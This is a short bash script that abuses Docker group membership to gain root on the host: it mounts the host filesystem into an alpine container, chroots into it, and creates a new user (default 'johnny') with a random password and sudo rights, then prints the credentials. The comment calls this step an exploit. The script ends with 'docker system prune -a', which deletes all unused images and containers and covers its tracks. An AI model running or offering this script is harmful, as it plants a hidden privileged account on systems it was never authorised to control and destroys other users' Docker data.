#!/bin/bash

# Function to generate a random 12-digit password with only alphanumeric characters
generate_password() {
  tr -dc '[:alnum:]' < /dev/urandom | head -c 12
}

# Default username
default_username="johnny"

# Check if a username is provided as a command-line argument
if [ "$#" -gt 0 ]; then
  username="$1"
else
  # If no username is provided, use the default "johnny"
  username="$default_username"
fi

# Check if the username already exists
if id "$username" >/dev/null 2>&1; then
  echo "Error: The username '$username' already exists. Please choose a different username."
  exit 1
fi

# Generate a random password
password=$(generate_password)

echo "Generating user with sudo privileges..."

# Perform exploit, run docker with root shell, and create a new user with sudo privileges
docker run -v /:/mnt --rm -it alpine chroot /mnt sh -c "printf \"$password\\n$password\\n\\n\\n\\n\\n\\nY\\n\" | adduser $username && sudo usermod -aG sudo $username && exit" >/dev/null 2>&1

# Display username and password
echo "Username: $username"
echo "Password: $password"

echo -e -n "\nCleaning up..."
printf "y" | docker system prune -a > /dev/null 2>&1

echo " Done!"
